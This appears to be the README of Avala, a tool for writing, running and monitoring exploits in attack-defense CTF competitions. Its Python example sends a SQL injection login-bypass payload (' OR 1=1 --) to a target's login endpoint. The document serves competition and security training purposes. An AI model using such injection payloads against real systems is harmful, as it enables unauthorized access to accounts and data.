# ⛰️ Avala — Develop and run exploits rapidly in A/D

<img src="https://raw.githubusercontent.com/dusanlazic/avala/refs/heads/develop/docs/docs/assets/logo.svg" width="300">

**Avala** is a specialized tool built for rapid developing, testing, running and monitoring exploits in attack-defense CTF competitions. The goal of Avala is to take the technical burden off the team players, enabling them to focus on writing exploits and patching vulnerabilities.

```py
from avala import exploit
import json
import requests


@exploit(service="foobar")
def attack(target: str, flag_ids: str):
    url = f"http://{target}:5000/login"
    username = json.loads(flag_ids)["username"]

    payload = {"username": username, "password": "' OR 1=1 --"}
    response = requests.post(url, json=payload)

    return response.text
```

The development of Avala was heavily influenced by the practical experiences and valuable insights gathered by the **Serbian National ECSC Team** 🇷🇸 who utilized the tool in many A/D competitions.

## Documentation

Documentation is available at [lazicdusan.com/avala](https://lazicdusan.com/avala).
